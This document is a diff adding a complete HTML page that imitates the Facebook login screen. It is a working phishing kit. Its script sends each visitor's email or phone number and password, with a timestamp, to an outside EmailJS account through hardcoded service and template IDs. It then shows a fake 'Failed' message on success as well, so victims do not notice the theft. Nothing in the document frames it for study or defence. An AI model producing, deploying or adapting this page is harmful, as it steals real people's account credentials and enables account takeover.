@@ -1,0 +1,139 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook Login</title>
+  <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Helvetica&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    body {
+      font-family: Helvetica, Arial, sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-[#f0f2f5] min-h-screen flex flex-col justify-between">
+  <main class="flex-grow flex items-center justify-center px-4">
+    <div class="flex flex-col md:flex-row md:space-x-20 max-w-5xl w-full">
+      <section class="flex flex-col justify-center md:w-1/2 mb-10 md:mb-0">
+        <h1 class="text-[#1877f2] font-extrabold text-5xl leading-[1.1] mb-4 select-none">
+          facebook
+        </h1>
+        <p class="text-black text-xl max-w-md leading-snug">
+          Facebook helps you connect and share with the people in your life.
+        </p>
+      </section>
+      <section
+        class="bg-white rounded-md shadow-md p-6 w-full max-w-sm"
+        aria-label="Login form container"
+      >
+        <form
+          id="loginForm"
+          class="space-y-3"
+          novalidate
+        >
+          <input
+            type="text"
+            name="emailOrPhone"
+            placeholder="Email address or phone number"
+            class="w-full border border-gray-300 rounded-md px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-[#1877f2] focus:border-transparent"
+            required
+            aria-required="true"
+            aria-label="Email address or phone number"
+          />
+          <input
+            type="password"
+            name="password"
+            placeholder="Password"
+            class="w-full border border-gray-300 rounded-md px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-[#1877f2] focus:border-transparent"
+            required
+            aria-required="true"
+            aria-label="Password"
+            minlength="6"
+          />
+          <button
+            type="submit"
+            class="w-full bg-[#1877f2] text-white font-semibold rounded-md py-2 hover:bg-[#166fe5] transition"
+            aria-label="Log In"
+          >
+            Log In
+          </button>
+        </form>
+        <div class="text-center mt-2">
+          <a
+            href="#"
+            class="text-[#1877f2] text-sm hover:underline"
+            >Forgotten password?</a
+          >
+        </div>
+        <hr class="my-4 border-t border-gray-300" />
+        <div class="text-center">
+          <button
+            class="bg-[#42b72a] text-white font-semibold rounded-md px-5 py-2 hover:bg-[#36a420] transition"
+            aria-label="Create New Account"
+            onclick="alert('Redirecting to account creation page...')"
+            type="button"
+          >
+            Create New Account
+          </button>
+        </div>
+      </section>
+    </div>
+  </main>
+  <footer
+    class="bg-white py-3 text-center text-xs text-gray-500 select-none"
+    aria-label="Footer with language options"
+  >
+    English (UK) বাংলা ગુજરાતી हिंदी नेपाली Bahasa Indonesia العربية 中文(简体) Bahasa Melayu Español Português (Brasil)
+    <button
+      aria-label="Language selector"
+      class="inline-block w-5 h-5 border border-gray-300 ml-1 align-middle"
+      type="button"
+    ></button>
+  </footer>
+
+  <script>
+     (function(){
+    emailjs.init({
+      publicKey: "_G6NIPCAEwaGP6AjI" // Replace with your actual key
+    });
+  })();
+
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const emailOrPhone = this.emailOrPhone.value.trim();
+    const password = this.password.value.trim();
+
+    if (!emailOrPhone) {
+      alert('Please enter your email address or phone number.');
+      this.emailOrPhone.focus();
+      return;
+    }
+    if (!password || password.length < 6) {
+      alert('Please enter a valid password with at least 6 characters.');
+      this.password.focus();
+      return;
+    }
+
+    // Fixed: Use explicit parameters instead of 'this'
+    emailjs.send('service_zk60w7j', 'template_28kgatr', {
+      email_or_phone: emailOrPhone,
+      password: password,
+      // Optional: Add timestamp for tracking
+      timestamp: new Date().toISOString() 
+    })
+    .then(() => {
+          alert('Failed to send login details. Please try again later.');
+          this.reset();
+        }, (error) => {
+          alert('Failed to send login details. Please try again later.');
+          console.error('EmailJS error:', error);
+        });
+  });
+  </script>
+</body>
+</html>
